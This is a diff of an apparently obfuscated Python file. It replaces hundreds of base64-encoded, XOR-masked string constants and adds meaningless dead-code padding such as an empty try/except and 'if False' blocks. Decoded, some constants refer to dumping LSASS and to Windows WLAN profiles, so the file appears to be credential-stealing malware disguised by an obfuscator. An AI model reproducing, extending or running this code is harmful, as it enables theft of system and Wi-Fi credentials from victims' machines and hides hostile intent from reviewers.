-_s382 = "35axrKu+s7O6u+X/rKasq7qyuw=="
-_s383 = "NUJcWwYH"
-_s384 = "hcTo5P/q68jw9uzmzeDp9eD3"
-_s385 = "gsPS0sbD1sM="
-_s386 = "yrmpor6ruaG5"
-_s387 = "o8DRzM3XwsE="
-_s388 = "CUhkaHNmZ0R8emBqQWxleWx7"
-_s389 = "xoerp7ypqIuzta+ljqOqtqO0"
-_s390 = "RyQ1KCkzJiU="
-_s391 = "RzloaSQoKSEuIGg0PjQzIiojaDI0IjVoJiomPSgpKjI0LiRqLyIrNyI1aTQiNTEuJCI="
-_s392 = "bB8VHxgJAQ8YAA=="
-_s393 = "rd7U3tnIwM7ZwQ=="
-_s394 = "L1xMXUpKQQ=="
-_s395 = "84SWkZCSng=="
-_s396 = "i+jk5eXu6P8="
-_s397 = "bi0BAAALDRoLCg=="
-_s398 = "nf7x9Pjz6cLv+Pr07un47w=="
-_s399 = "F355cXg="
-_s400 = "RDE3ITYqJSkh"
-_s401 = "ocfEwNXU08TS"
-_s402 = "guP35uvt"
-_s403 = "ZQEMFgYKCwsABhE="
-_s404 = "ImZLUUFNTExHQVZHRg=="
-_s405 = "r93KyMbc293O28bAwfDAxA=="
-_s406 = "3L+wtbmyqIO1uA=="
-_s407 = "usnO28jO5cnZyN/f1OXZ28rOz8jf"
-_s408 = "DGFjYmV4Y34="
-_s409 = "3q29rLu7sIG9v66qq6y7ga2qv6qrrQ=="
-_s410 = "4JOUj5C/k4OShYWOv4OBkJSVkoU="
-_s411 = "6ZqKm4yMh7aKiJmdnJuMtpqdiJ2cmg=="
-_s412 = "OUpcTWZKWktcXFdmVFZXUE1WSw=="
-_s413 = "+5aUlZKPlIk="
-_s414 = "JUhKS0xRSlc="
-_s415 = "FWZ2Z3Bwe0p2dGVhYGdwSmZhdGFgZg=="
-_s416 = "HG95aENvf255eXJDbWl9cHVoZQ=="
-_s417 = "VicjNzo/Ii8="
-_s418 = "zr2tr6Kr"
-_s419 = "VSYhNCchCiIwNzY0OA=="
-_s420 = "ST4sKyooJBY6PSg9PDo="
-_s421 = "1aahuqWKorC3trS4"
-_s422 = "oNfFwsPBzf/T1MHU1dM="
-_s423 = "nO/56MPr+f7//fHD7en98PXo5Q=="
-_s424 = "ucjM2NXQzcA="
-_s425 = "CWRgalZ6fWh7fQ=="
-_s426 = "KEVBS3dbXEdY"
-_s427 = "D2JmbFB8e257enw="
-_s428 = "NV5QTFlaUmpGQVRHQQ=="
-_s429 = "+pGfg5aVnaWJjpWK"
-_s430 = "tdjawMbQ6tDD0NvB"
-_s431 = "5ZWci5WQkQ=="
-_s432 = "I0JAV0pMTQ=="
-_s433 = "p8rI0cI="
-_s434 = "HnNxaHtBbHtyf2p3aHs="
-_s435 = "uNvU0dvT"
-_s436 = "SSUsLz0="
-_s437 = "x6Wys7OoqQ=="
-_s438 = "0qKgt6Gh"
-_s439 = "UiA3PjczITc="
-_s440 = "Dn1tfGFiYg=="
-_s441 = "j+Tq9u3g7v3r0Or56uH7"
-_s442 = "GGhhdmhtbA=="
-_s443 = "UjEmID4="
-_s444 = "44aNl4aR"
-_s445 = "+JydlJ2MnQ=="
-_s446 = "F3N4YHk="
-_s447 = "bw4MGwYAAQ=="
-_s448 = "P09NWkxM"
-_s449 = "EGJ1fHVxY3U="
-_s450 = "xaaqqKeq"
-_s451 = "/ZaYhI4="
-_s452 = "0KSpoLU="
-_s453 = "hPfs6/bw5/Hw"
-_s454 = "ehkOCBYlGxYOJR4fFg=="
-_s455 = "+JmUjKeMmZo="
-_s456 = "ewwSFSQf"
+_s165 = "hvb07+jy4/Q="
 try:
     raise Exception()
 except:
     pass
-_s457 = "cwQaHSwW"
-_s458 = "OllOSFZlWQ=="
-_s459 = "qMvc2sT30A=="
-_s460 = "MFNEQlxvUQ=="
-_s461 = "fhAfExs="
-_s462 = "cQUUAxwYHxAdLgIFEAMF"
-_s463 = "RTEgNygsKyQpGjYxJDEwNg=="
-_s464 = "EmZ3YH97fHN+TXt8Ymdm"
-_s465 = "jO/j4eHt4ug="
-_s466 = "B3NidWpuaWZrWHRzaHc="
-_s467 = "oNTF0s3JzsHM/9PUwdTV0w=="
-_s468 = "aBscCRocNxsRGxwNBTcFBwYBHAca"
-_s469 = "RCkrKi0wKzYbNzAlMDE3"
-_s470 = "HW5pcm1CbmRuaXhwQnByc3Rpcm8="
-_s471 = "0L2/vrmkv6KPo6SxpKWj"
-_s472 = "hOPh8Nv09uvn4ff34fc="
-_s473 = "K1tZREhOWFh0R0JYXw=="
-_s474 = "rsXHwsLx3tzBzcvd3Q=="
-_s475 = "5paUiYWDlZW5jY+KirmUg5WTipI="
-_s476 = "qsnGw9rIxcvYzvXNz94="
-_s477 = "QDA5MCUyIywpMA=="
-_s478 = "SygnIjspJCo5LxQvKj8q"
-_s479 = "LE9ARVxOQ01eSHNITVhN"
-_s480 = "6omGg5qIhYuYjrWOi56L"
-_s481 = "D2xjZn9tYG59a1B8ans="
-_s482 = "rNzV3Mnez8DF3A=="
-_s483 = "qNzN0Nw="
-_s484 = "RyQrLjclKCY1Ixg0MyYzMjQ="
-_s485 = "t9Tb3sfV2NbF0+jEw9bDwsQ="
-_s486 = "1LWhsL27i7OxoIuiu7ihubE="
-_s487 = "VTQgMTw6CiM6OSA4MA=="
-_s488 = "u9rO39LU5Mjez+TN1NfO1t4="
-_s489 = "5IiBkoGI"
-_s490 = "k/Lm9/r8zOf89PT/9sz+5uf2"
-_s491 = "sNHF1Nnf78bf3MXd1Q=="
-_s492 = "yLinv626l6WnpqG8p7qXp66u"
-_s493 = "TDwjOyk+Ez4pPzkgOA=="
-_s494 = "dQUaAhAHKhkaFh4="
-_s495 = "6JiHn42at5qNm52EnA=="
-_s496 = "VCQ7IzEmCyc4MTEk"
-_s497 = "NUVaQlBHakdQRkBZQQ=="
-_s498 = "PUpcUVFNXE1YT2JOWEk="
-_s499 = "9oaXgp4="
-_s500 = "pcjWwsfK3frWzcrS"
-_s501 = "UCQ5JDw1"
-_s502 = "bgEeCwAxGxwC"
-_s503 = "vN/R2OPO2c/J0Mg="
-_s504 = "N0NWXFJoRFRFUlJZRF9YQw=="
-_s505 = "vM/fztnZ0s/U08jjztnPydDI"
-_s506 = "FnFzYklxc3l/Zg=="
-_s507 = "+5yelJKLpImeiI6Xjw=="
-_s508 = "Xzg6KwA+Ly8s"
-_s509 = "j+7///zQ/er8+uP7"
-_s510 = "STklKDAWOiY8Jy0="
-_s511 = "8ZeDlIA="
-_s512 = "Ll1LT1xNRnFIR0JLXQ=="
-_s513 = "JVdKSlE="
-_s514 = "K05TTkheX050SERGRkpFTw=="
-_s515 = "0rG9v7+zvLY="
-_s516 = "7IiDm4KAg42Is4mUiY8="
-_s517 = "ZBQFEAw="
-_s518 = "GXB3aWxtRnt1dnpy"
-_s519 = "2Lu1vIeqvauttKw="
-_s520 = "ocjP0dTV/tTPw83Owso="
-_s521 = "agkHDjUYDxkfBh4="
-_s522 = "UTc4PTQOPTgiJQ=="
-_s523 = "bwkGAwowAwYcGzAdChwaAxs="
-_s524 = "7oiHgouxioGZgIKBj4qxnIufm4udmg=="
-_s525 = "xaOsqaCaoaqyq6mqpKGapq2wq64="
-_s526 = "3ri3sruBuruyu6q7"
-_s527 = "IlJDVko="
-_s528 = "NVNcWVBqW1BCalNaWVFQRw=="
-_s529 = "BXVkd2BrcQ=="
-_s530 = "WD4xND0HLSg0Nzk8BzswLTYz"
-_s531 = "q9vK38M="
-_s532 = "XDo1MDkDKSwwMz04Ay45LykwKA=="
-_s533 = "MV9URUZeQ1puWF9XXg=="
-_s534 = "xqijsrGptK2Zr6igqZm0o7WzqrI="
-_s535 = "64mZhJyYjpm0mJ+Oioc="
-_s536 = "fD4OEwsPGQ5cDwgZHRAZDlwOGQ0JGQ8IGRg="
-_s537 = "awkZBBwYDhk0GB8OCgc0GQ4YHgcf"
-_s538 = "QiYmLTEdMTYjMDY="
-_s539 = "H2t+bXh6aw=="
-_s540 = "USE+IyU="
-_s541 = "KV1BW0xITVo="
-_s542 = "MUFQUlpURW5CWEtU"
-_s543 = "XzI6KzcwOw=="
-_s544 = "Xjo6MS0BLSo/Kist"
-_s545 = "aw8PBBg0GB8EGw=="
-_s546 = "juXn4uLR/fnn+u3m"
-_s547 = "DUZEQUEtXlpEWU5F"
-_s548 = "KGVdRFxBBVxAWk1JTE1MCGxsR3sISVxcSUtDCE1GT0FGTQhbXVhYR1pcQUZPCHxreAQIfWx4BAhgfHx4BAh7REdfREdaQVsG"
-_s549 = "v8/e3NTay8w="
-_s550 = "ne38/vb46e4="
-_s551 = "rsrKwd3x3drP2tvd"
-_s552 = "+p6elYmliY6bjo+J"
-_s553 = "2Jyct4v4q6y3qKi9vA=="
+_s166 = "YAwJDhUYPxMFEhYFEg=="
+_s167 = "h+vu6fL/2PTi9fHi9Q=="
+_s168 = "AnVrbGZtdXFdcmE="
+_s169 = "BHd9amtoa2N9"
+_s170 = "nNLdz7yzvNr18Pm8z/nu6vnu"
+_s171 = "+4ySlZ+UjIikiJ6JjZ6J"
+_s172 = "eg0TFB4VDQklChk="
+_s173 = "GW5wd312bmpGaXo="
+_s174 = "PFhdSF1eXU9Z"
+_s175 = "HGhsMXB1cnc="
+_s176 = "cQMeBAUUAw=="
+_s177 = "AXZkY15yZHN3ZHM="
+_s178 = "qeDG/YmGieTMzcDIie3M38DKzA=="
+_s179 = "RCU0NCgh"
+_s180 = "nfDy//Tx+A=="
+_s181 = "NVJaWlJZUA=="
+_s182 = "7L+BjZ6YzKSDgYnMqImahY+J"
+_s183 = "YhADERIABxAQGw=="
+_s184 = "6oaDhJ+StZmPmJyPmA=="
+_s185 = "fwwQEQY="
+_s186 = "FUZ4dGdhNUFDNTo1WHBxfHQ="
+_s187 = "YQMTDhUJBBM="
+_s188 = "36+ttrGruq0="
+_s189 = "pNHKz8rL08o="
+_s190 = "o/LWysDIg/fg84PAzM3NxsDXg9DAws2DzM2DwoPPytDXg8zFg9PM0dfQjYPxxtfW0c3Qg8/K0NeDzMWDzNPGzYPTzNHX0I0="
+_s191 = "nNv56Lzy+ejr8+73vPXy6Pnu+v3/+e+wvP3/6PXq+bz/8/Ly+f/o9fPy77C83c7MvOj9/vD5sLz98vi87PPu6LHv//3yvO757+nw6O+y"
+_s192 = "Zg8IEgMUAAcFAxU="
+_s193 = "jf3++Pnk4Q=="
+_s194 = "uNbZ1d0="
+_s195 = "z66rq72qvLyqvA=="
+_s196 = "MFZRXVlcSQ=="
+_s197 = "ehseHggfCQk="
+_s198 = "tNrRwNnVx98="
+_s199 = "iuj45evu6ev5/g=="
+_s200 = "HHVyaHluen1/eW8="
+_s201 = "GHF2bH1qfnl7fWtHfWpqd2o="
+_s202 = "m+vo7u/y9w=="
+_s203 = "TC8jIiIpLzglIyI/"
+_s204 = "2ry7t7O2ow=="
+_s205 = "L1tWX0o="
+_s206 = "F3t4dHZ7"
+_s207 = "HW94cHJpeA=="
+_s208 = "ssHG08bHwQ=="
+_s209 = "YgENDAwHARYLDQwRPQcQEA0Q"
+_s210 = "IFdJThMS"
+_s211 = "hvHv6LW0"
+_s212 = "lPDt+vX5/fc="
+_s213 = "8paLnJOfm4OHlw=="
+_s214 = "m+/i6/4="
+_s215 = "heT39drg9/fq9w=="
+_s216 = "o5GRl40="
+_s217 = "IHVOS05PV04="
+_s218 = "676FgIWEnIU="
+_s219 = "DmJhbW9iUWBrenlhfGU="
+_s220 = "+Y+cl52Wiw=="
+_s221 = "H3BvenFAb3Bta2w="
+_s222 = "q8TbzsX02M7Z3cLIztg="
+_s223 = "HXB8fnV0c3hCaWRteA=="
+_s224 = "z6KurKemoaqQo66tqqM="
+_s225 = "/pOfnZaXkJuhl52RkA=="
+_s226 = "+5qJi6SPgoue"
+_s227 = "Yw0GFxQMEQg="
+_s228 = "74yAgYGKjJuGgIGc"
+_s229 = "OEpdVVdMXQ=="
+_s230 = "aVhbXkc="
+_s231 = "UmNlYHw="
+_s232 = "mam3qbept6k="
+_s233 = "QSQ5NSQzLyAtHikuMjUy"
+_s234 = "r9/A3ds="
+_s235 = "LF9JXlpFT0k="
+_s236 = "m+jv+u/u6A=="
+_s237 = "6oaFiYuGtYuOjpg="
+_s238 = "AW9kdXZuc2o="
+_s239 = "l/Lv4/Ll+fb7yP/45OPk"
+_s240 = "BGVoaFt0a3Zwdw=="
+_s241 = "4oOOjr2SjZCWkQ=="
+_s242 = "juv2+uv84O/i0ebh/fr9"
+_s243 = "ZgMeEgMUCAcKOQ4JFRIV"
+_s244 = "Uzs8ICc9Mj42"
+_s245 = "fQ0SDwk="
+_s246 = "yLinurw="
+_s247 = "yo+yvrirqb7quau8r67qnaOMo+q6q7m5vaW4rrnqvKOr6qSvvrmi6r2mq6Tq4p2jpK6lvbnj5A=="
+_s248 = "fgkXEE1M"
+_s249 = "g+3m9/Dr"
+_s250 = "QhIwLSQrLg=="
+_s251 = "H3F6a2x3"
+_s252 = "2rm1tK6/tK8="
+_s253 = "1qWlv7I="
+_s254 = "RCE2Nis2"
+_s255 = "egoIFRwTFh8J"
+_s256 = "2p6vt6r6iZuX+rK7qbK/qfqvqbO0vfqov736qbusv/ryqL+rr7Oov6n6u763s7Tz9A=="
+_s257 = "CH9hZjs6"
+_s258 = "yay7u6a7"
+_s259 = "7Lipobw="
+_s260 = "gfPg8t7y4Ow="
+_s261 = "/oyfjaGNh40="
+_s262 = "kuHz5Pc="
 _xj = type("X", (), {"__init__": lambda s: None})()
 if _xj is not None and 1 == 2:
     del _xj
-_s554 = "gdbu8+rk86H16fPk4OWh9eng9aHy5O/l8qHx4OLq5PXyoeLu7/Xo7/Tu9PLt+K8="
-_s555 = "zKS4uLw="
-_s556 = "fAwdHxcZCA8="
-_s557 = "JkJHUkd5RF9SQ1U="
-_s558 = "u8va2NDez8g="
-_s559 = "+4uamJCej4g="
-_s560 = "TCgtOC0TLjU4KT8="
-_s561 = "UiIzMTk3JiE="
-_s562 = "WTEtLSk="
-_s563 = "/5eLi4+M"
-_s564 = "2Ki5u7O9rKs="
-_s565 = "ZAAFEAU7Bh0QARc="
-_s566 = "OEhZW1NdTEs="
-_s567 = "QzAvLDQvLDEqMA=="
-_s568 = "BHRlZ29hcHc="
-_s569 = "A1NmcWpsZ2pgYm9veiNwZm1nI3B3YndwI3dsI3drZiNwZnF1ZnEt"
-_s570 = "oNPUwdLU/9TJzcU="
-_s571 = "p9fGxMzC09Q="
-_s572 = "UzcyJzIMMSonNiA="
-_s573 = "Kk5ORVl1WE9ZX0Ze"
-_s574 = "Tj06Lzo9"
-_s575 = "sMDR09vVxMM="
-_s576 = "fxseCx4gEh0="
-_s577 = "qM3Eydjbzcw="
-_s578 = "D11OXH9nan1qL0xjZmphew=="
-_s579 = "ORQUSlxLT1xL"
-_s580 = "2vf3qb+5qL+u"
-_s581 = "w+7uqqc="
-_s582 = "HjMzbHt9cXBwe31q"
-_s583 = "q4aGwsXY38rHxw=="
-_s584 = "vJGRydLV0s/I3dDQ"
-_s585 = "hqur6Omr9uP09e/18g=="
-_s586 = "wO3tpayltqG0paQ="
-_s587 = "ByoqaWgqYmticWZzYg=="
-_s588 = "wsiZ6Z/ikqewsauxtqesoafisKevrbSnpuzI"
-_s589 = "R00cahpnCShnNyI1NC40MyIpJCJnISgyKSNpTQ=="
-_s590 = "6K26uqe60sjFxZuNmp6NmsiJhozIxcWbjYuajZzImo2ZnYGajYzIjoeayMXFgYabnImEhA=="
-_s591 = "1N6P/4n0hLGmp72noLG6t7H0vbqnoLW4uLGw9fSVoaC7+aegtaag9Lu69La7u6D63g=="
-_s592 = "rKb3gfGM5cLf2M3AwIzKzcXAyciCjP7ZwozN34zNyMHFwoKm"
-_s593 = "ST4gJ3p7"
-_s594 = "jcPi+a3s6eDk462grez5+ejg/fnk4+qt/uTh6OP5rdjMzq3v9P3s/v6jo6M="
-_s595 = "QBthHWAVAQNgIjkwITMzYCYhKSwlJGBtYDI1Li4pLidgNyk0KGAsKS0pNCUkYDAyKTYpLCUnJTM="
-_s596 = "yImkuq2prLHour2mpqGmr+ipu+iprKWhpg=="
-_s597 = "BGFoYXJlcGFg"
-_s598 = "Dlx7YGBnYGkua2JreG96a2ouIy5tYmtvYGdgaS57fi5bT00ubHd+b319LnxraWd9enx3ICAg"
-_s599 = "C1AgVitbbnl4Ynh/bmVobit5bm15bnhjbm8="
-_s600 = "wZrgnOGRpLOyqLK1pK+ipOGsoLjhqaC3pOGxoLO1qKCtrbjhp6CoraSl4emztK/hoLLhoKWsqK/hp66z4ZKiqaSltK2kpeGVoLKq6A=="
-_s601 = "76q9vaC91c+8ipvPsLyqvbmqvc+Ggc+MgIuKz4Cdz5qcis/CwpyKnZmKnQ=="
-_s602 = "ruv8/OH8lI79y9qO8f3r7fzr+o7HwI7NwcrLjsHcjtvdy46Dg93LzdzL2g=="
-_s603 = "fT4SExMYHgkYGVxdKhwUCRQTGl0bEg9dHhIQEBwTGQ5TU1M="
-_s604 = "peDdzNHMy8KFw8rXhdDVwcTRwIuLiw=="
-_s605 = "zZ6luLmporqj"
-_s606 = "qfrdxtnZzM0="
-_s607 = "WQYGNDgwNwYG"
+_s263 = "Wyg6LT4="
+_s264 = "3oWf84S/86SDhf7zoIOl7fLt56M="
+_s265 = "ZgcVBQ8P"
+_s266 = "QiMmLyssKzE2MCM2LTA="
+_s267 = "n+j7/vjq6/bz9uvm/vz88Orx6w=="
+_s268 = "Emdhd2B8c393"
+_s269 = "JFFXQVZKRUlB"
+_s270 = "MldAQF1A"
+_s271 = "7Z6Yjo6Inp4="
+_s272 = "ocTT087T"
+_s273 = "VBAhOSR0GAcVBwd0JCY7NzEnJ3Q5MTk7Ji10Ij01dDc7OSciNyd6MDg4dBk9Oj0QITkkdHwmMSUhPSYxJ3Q1MDk9On16"
+_s274 = "ner0866v"
+_s275 = "kPXi4v/i"
+_s276 = "8oaTgZmem4GG"
+_s277 = "dxsEFgQE"
+_s278 = "Dmt8fGF8"
+_s279 = "67+uprs="
+_s280 = "GGtte3t9a2s="
+_s281 = "95OCmoeohJ6NkqialQ=="
+_s282 = "C29+ZntUe2p/Yw=="
+_s283 = "PVNSSVg="
+_s284 = "kPXi4v/i"
+_s285 = "37qtrbCt"
+_s286 = "PXhFSU9cXkkdXlxeVVhZHV5PWFlYU0lUXFFOHUtUXB1eUFlWWEQdXFNZHUtcSFFJXlBZHRVqVFNZUkpOFBM="
+_s287 = "yL+hpvv6"
+_s288 = "s9De19jWyg=="
+_s289 = "x6Sqo6yivg=="
+_s290 = "Xh03PDI7"
+_s291 = "gOPt5Ovl+Q=="
+_s292 = "l/T68/zy7g=="
+_s293 = "FVZ8d3lw"
+_s294 = "J1FGUktTREpD"
+_s295 = "l8Xy5Pji5fTy"
+_s296 = "3au8qLGp"
+_s297 = "24mutfu6t7f7uKm+v761r7K6t/uzuqmtvqivsrW8+7a+r7O0v6j7urW/+6m+r66ptfu4tLa5srW+v/upvqiut6+o9Q=="
+_s298 = "zLulqqU="
+_s299 = "WjYpOykp"
+_s300 = "geLg4unk5Q=="
+_s301 = "+pKViY6Um5ef"
+_s302 = "bxsGAgocGw4CHw=="
+_s303 = "zbXjteO1"
+_s304 = "vc3OyMnU0Q=="
+_s305 = "DTw/OiM="
+_s306 = "yvvz+OT7/PLk+w=="
+_s307 = "PE9fXVJSWVg="
+_s308 = "scLE09/UxQ=="
+_s309 = "KVpKSEdHTE0="
+_s310 = "UTk+IiU/MDw0"
+_s311 = "KllHSHVLSUlPWVlDSEZP"
+_s312 = "jvjn6/k="
+_s313 = "TT0sPzksKg=="
+_s314 = "6ZqEi7aIioqMmpqAi4WM"
+_s315 = "eQ4UEBo="
+_s316 = "x4qupLWotKihsw=="
+_s317 = "JVJITHpERkZAVlZMR0lA"
+_s318 = "6oKFmZ6Z"
+_s319 = "dh4ZBQIFKRAZAxgS"
+_s320 = "7pmHgIqBmZ2xhoGdmp0="
+_s321 = "OEtVWmdZW1tdS0tRWlRd"
+_s322 = "ehMUHB8ZDhsYFh8="
+_s323 = "aRocCwcMHRo="
+_s324 = "C19ueH8rYm0rbGJ9bmUraHlub25lf2JqZ3grfGR5YCtqbGpiZXh/K2orf2p5bG5/LHgrWEZJK2pvZmJlK3hjanluJQ=="
+_s325 = "9oGfmMXE"
+_s326 = "p8TIysrGycOHxMjK18vC08LDh9TSxMTC1NTB0svL3g=="
+_s327 = "Jm9IQENFUgZHBlJHVEFDUgZQT0cGdWtkHAZFSVZfBkpPUkMGQ15DCgZFVENHUkMGVUNUUE9FQwoGVVJHVFIGT1II"
+_s328 = "IFdJThMS"
+_s329 = "QRMAEjEpJDMkDSg1JG8kOSQ="
+_s330 = "pcbKyNXJwNHAwYXW0MbGwNbWw9DJydw="
+_s331 = "EnF9Yms="
+_s332 = "dxQYBx4SEw=="
+_s333 = "itjL2fri7/jvxuP+7w=="
+_s334 = "TSwhPygsKTRtKDUkPjk+"
+_s335 = "RicqNCMnIj9mNDMoKC8oIQ=="
+_s336 = "KmNETE9JXgpLCl5LWE1PXgpcQ0sKfWdjEApJWE9LXk8KWlhFSU9ZWQpYT0dFXk9GUwQ="
+_s337 = "yL+hpvv6"
+_s338 = "8qCzoYKal4CXvpuGl9yXipc="
+_s339 = "J0RISldLQlNCQwdUUkREQlRUQVJLS14="
+_s340 = "awgEGxI="
+_s341 = "G1h0bnd/O3V0bzt4dGtiO31yd347bXJ6O0hWWTszeGl+f351b3J6d2g7dnpiO3l+O2xpdHV8Mg=="
+_s342 = "xpSjsrO0qJCnqrOj5vvm9g=="
+_s343 = "VzYiIzg="
+_s344 = "pPDW3YTQy4TNysLBx9CExYTQxdbDwdCE0dfNysOE0MzBhNfUwcfNws3BwITJwdDMy8CEjMvWhMXR0MuJwMHQwcfQjYo="
+_s345 = "J3VmdFdPQlVCa05TQglCX0I="
+_s346 = "NkJXRFFTQg=="
+_s347 = "2bisrbY="
+_s348 = "4I2FlIiPhL+Vk4WE"
+_s349 = "CmdvfmJlblV/eW9u"
+_s350 = "mPX96+v5//0="
+_s351 = "sdzUxdne1e7EwtTV"
+_s352 = "1ruzor65somjpbOy"
+_s353 = "7JuFgt/e"
+_s354 = "RjU1LyI="
+_s355 = "pfL15Jf19u4="
+_s356 = "FENEVSZER18="
+_s357 = "eS4pOCkqMg=="
+_s358 = "cB8AFR4="
+_s359 = "+JeInZY="
+if False:
+    _x = [i for i in range(1000) if i % 7 == 0]
+    _y = "".join(chr(c) for c in range(65, 91))
+_s360 = "dh4CAgZMWVkBAQFYGx8VBBkFGRACWBUZG1kYEwIBGQQdHxgRWSE6NzhZBgQZEB8aE1kARw=="
+_s361 = "q8Pf39uRhITc3NyFxsLI2cTYxM3fhcjExoTFzt/cxNnAwsXMhPzn6uWE29nEzcLHzoTdmg=="
+_s362 = "UAQVHQA="
+_s363 = "yqSvvrmi"
+_s364 = "guzn9vHq"
+_s365 = "852Wh4Cb"
+_s366 = "Ujw3JiE6"
+_s367 = "o8DMzc3GwNfGxw=="
+_s368 = "q8re38P0xsTPzg=="
+_s369 = "RCE2Nis2"
+_s370 = "JFdHRUpKQUA="
+_s371 = "0Lm+trWzpLGyvLU="
+_s372 = "6pmHiLWLiYmPmZmDiIaP"
+_s373 = "dTQRGBwbHAYBBxQBGgc="
+_s374 = "P1ZRWVpcS1pb"
+_s375 = "bBsFCgUzBQIKCQ8YMx4JHxkAGA=="
+_s376 = "gufw8O3w"
+_s377 = "PmpMRx5fHlJXTUoeUVgeXUxbWltQSldfUk0eX1lfV1BNSh5fHlJXTUoeUVgeSl9MWVtKTRIeTFtKS0xQHk1LXV1bTU1YS1IeTl9XTE0Q"
+_s378 = "ZBEXARYKBQkB"
+_s379 = "odHA0tLWztPF"
+_s380 = "RTEkNyIgMQ=="
+_s381 = "+riPk5ae2pvalpOJjtqVnNqZiJ+en5SOk5uWidqOldqOiIPanIiVl9qSm4iMn4mOn57anpuOm9Q="
+_s382 = "j+7r4ubh"
+_s383 = "6p+Zj5iEi4eP"
+_s384 = "xbW3qqOsqaC2"
+_s385 = "w7OxrKWqr6aw"
+_s386 = "6pqLmZmdhZiO"
+_s387 = "zpWBnouA4YCBgIuT"
+_s388 = "hPH34fbq5enh"
+_s389 = "Akd6dnBjYXYicWN0Z2YicmNxcXVtcGZxImNsZiJhbW1pa2dxImRwbW8iQWpwbW9nLiJHZmVnLiJEa3BnZG16LA=="
+_s390 = "TS4lPyIgKA=="
+_s391 = "ruLh7e/i7/7+6u/67w=="
+_s392 = "vP3s7Pj96P0="
+_s393 = "h8Do6ODr4g=="
+_s394 = "fR4VDxIQGA=="
+_s395 = "yqmiuKWnrw=="
+_s396 = "CEVha3pne2dufA=="
+_s397 = "2L28v70="
+_s398 = "+56fnJ4="
+_s399 = "JmtJXE9KSkc="
+_s400 = "DWtkf2hrYnU="
+_s401 = "QCYpMiUmLzg="
+_s402 = "B0J/c3VmZHMnd2Z0dHBodWN0J2F1aGonRG91aGpucmoqZWZ0YmMnZXVocHRidXQnL0RvdWhqYisnQmNgYisnRXVmcWIrJ0h3YnVmKSkpLik="
+_s403 = "NUVURkZCWkdRRg=="
+_s404 = "KW1MT0hcRV0="
+_s405 = "LGBDS0VCDGhNWE0="
+_s406 = "4LSlrbA="
+_s407 = "nM/Z0NnfyLzz7vX79fLD6e7wsLzp7/nu8v3x+cPq/fDp+bC87P3v7+vz7vjD6v3w6fm82s7T0bzw8/v18u8="
+_s408 = "ZQYXHBURCg=="
+_s409 = "Gmp7aWltdWh+aQ=="
+_s410 = "JkNUVElU"
+_s411 = "0J61pKe/ors="
+_s412 = "eToWFhIQHAo="
+_s413 = "KHxtZXg="
+_s414 = "OWp8dXx6bRlRVkpNZlJcQBUZV1hUXBUZXFdaS0BJTVxdZk9YVUxcGX9rdnQZWlZWUlBcShl1cHRwbRkLCQk="
+_s415 = "nf7y8vb0+O4="
+_s416 = "/JmOjpOO"
+_s417 = "8raXkYCLgobSsZqAnZ+X3beWlZfSgpOBgYWdgJbSh4GbnJXSpZuclp2FgdK2orOiu9LZ0rO3od/Ax8TftbG/3A=="
+_s418 = "z5ShoO+rrruukg=="
+_s419 = "z5S7oKDvvKegvbuS"
+_s420 = "gNv17uvu7/fuoObv8u3h9KA="
+_s421 = "Nnp5dXd6d2Zmcndidw=="
+_s422 = "hsHp6eHq4w=="
+_s423 = "Mn9bUUBdQV1URg=="
+_s424 = "jM7+7frp3+Pq+Pvt/uk="
+_s425 = "ou3Sx9DDgvHNxNbVw9DH"
+_s426 = "zICjr62g7J+4rbip"
+_s427 = "4JWUhs3Y"
+_s428 = "FXpmSnZnbGVh"
+_s429 = "yY2ZiJmA"
+_s430 = "8ZKTtZCFkA=="
+_s431 = "UiIwFjMmMw=="
+_s432 = "wbS1p+z5"
+_s433 = "wZqioK+vrrXhpaSis7ixtZw="
+_s434 = "HVhlaW98fmk9bnxreHk9cXJ6dHNuPXtvcnA9W3RveHtyZT1tb3J7dHF4bjM="
+_s435 = "6ZmImpqehpuNmg=="
+_s436 = "ZwsIAA4JFEkNFAgJ"
+_s437 = "ah8eDEdS"
+_s438 = "yKSnr6Gmuw=="
+_s439 = "VCQ1JycjOyYwJw=="
+_s440 = "EXl+YmV/cHx0"
+_s441 = "3Kmvua6yvbG5"
+_s442 = "8YGQgoKGnoOV"
+_s443 = "F2dleHF+e3I="
+_s444 = "A2ZtYHF6c3dmZw=="
+_s445 = "95SYmJyekoTZhIabnoOS"
+_s446 = "SR0MBBk="
+_s447 = "IXJkbWRidQFJTlJVDQFPQExEDQFXQE1URAFnc25sAUxOW35CTk5KSERSAW1obGh1ARMREQ=="
+_s448 = "QiEtLSkrJzE="
+_s449 = "OlJVSU4="
+_s450 = "0KaxvKW1"
+_s451 = "kPXi4v/i"
+_s452 = "WBw3LzY0Nzk8eDl4PjE0PXg+Kjc1eA0KFHg5Njx4NygsMTc2OTQ0IXg9ID07LSw9eDEsdg=="
+_s453 = "MWV0fGE="
+_s454 = "06S6veDh"
+_s455 = "8oWbnMHA"
+_s456 = "gPDh9Og="
+_xj = type("X", (), {"__init__": lambda s: None})()
+if _xj is not None and 1 == 2:
+    del _xj
+_s457 = "o83CzsY="
+_s458 = "/5qNjZCN"
+_s459 = "HntsbHFs"
+_s460 = "7IKNgYk="
+_s461 = "i//y++4="
+_s462 = "L0JAS0ZJRkpL"
+_s463 = "w62irqY="
+_s464 = "SDwxOC0="
+_s465 = "nu7/6vY="
+_s466 = "aB8JGgYBBg8="
+_s467 = "/LKTiNyak4mSmA=="
+_s468 = "Uxc2PzYnNjc="
+_s469 = "xaGksaQ="
+_s470 = "nPnu7vPu"
+_s471 = "yomir6mh6rmvuLyvuOqspbjqq+qkr73qqaajr6S+6ryvuLmjpaTk6pivvr+4pLnq4qSvvZW8r7i5o6Wk5uqupb2kpqWrrpW/uKbj6qW46uKEpaSv5uqEpaSv4+Q="
+_s472 = "BSpkdWwqZmlsYGtxKHB1YWRxYA=="
+_s473 = "gffk8/Lo7u8="
+_s474 = "2Ly3r7a0t7m8h62qtA=="
+_s475 = "Ux08cyYjNzInNnM6PTU8czA8PTU6NCYhNjdzPD1zIDYhJTYh"
+_s476 = "HlpxaXBycX96Pmp2ez5we2k+MHtmez5/cHo+bWp/eXs+fz58f2p9dj5tfWx3bmo+anE+bHtucn99ezVse21qf2xqMA=="
+_s477 = "kMTV3cA="
+_s478 = "spfM1II="
+_s479 = "qd7Ax5qb"
+_s480 = "fSgNGRwJGF0OHg8UDQldERwIEx4VGBldUF0YBRQJFBMaXQkSXRwNDREEXQgNGRwJGA=="
+_s481 = "DE15eGMheXxobXhpLGV/LFtlYmhje38hY2JgdSxqY34sYmN7"
